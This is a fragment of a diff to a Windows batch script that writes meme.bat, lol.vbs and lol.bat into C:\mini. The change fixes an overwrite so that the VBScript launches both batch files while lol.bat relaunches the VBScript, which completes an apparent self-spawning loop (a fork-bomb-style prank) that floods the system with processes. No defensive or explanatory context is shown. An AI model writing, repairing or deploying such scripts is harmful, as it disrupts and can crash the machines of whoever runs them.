@@ -69,7 +69,7 @@ echo :stop>>"C:\mini\meme.bat"
 echo exit>>"C:\mini\meme.bat"
 
 echo CreateObject("WScript.Shell").Run("C:\\mini\\meme.bat")>"C:\mini\lol.vbs
-echo CreateObject("WScript.Shell").Run("C:\\mini\\lol.bat")>"C:\mini\lol.vbs
+echo CreateObject("WScript.Shell").Run("C:\\mini\\lol.bat")>>"C:\mini\lol.vbs"
 
 echo @echo off>"C:\mini\lol.bat
 echo start cscript "C:\mini\lol.vbs">"C:\mini\lol.bat"
